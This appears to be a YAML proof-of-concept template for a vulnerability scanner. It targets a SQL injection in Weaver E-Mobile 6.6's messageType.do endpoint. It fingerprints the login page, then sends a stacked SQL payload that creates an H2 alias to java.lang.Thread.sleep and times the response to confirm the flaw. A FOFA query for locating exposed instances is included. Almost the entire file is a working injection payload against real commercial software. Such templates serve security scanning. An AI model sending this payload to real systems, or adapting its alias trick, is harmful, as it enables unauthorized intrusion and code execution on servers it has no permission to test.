id: poc-yaml-weaver-e-mobile-v6-messagetype-do-sqli
info:
  name: 泛微E-mobile 6.6 messageType.do SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: e-mobile
  fofa: E-Mobile 6.6
variables:
  t1: random_int(5,10)
  t2: t1 * 1000
requests:
- method: GET
  path: /login.do
  expression: status_code == 200 && contains(body,"E-Mobile")
- method: POST
  path: /messageType.do
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: 'method=create&typeName=1'';CREATE ALIAS sleep222 FOR

    "java.lang.Thread.sleep";CALL sleep222({{.t2}});select+''1'
  expression: status_code == 200 && contains(body,"status") && duration > t1
transport: http
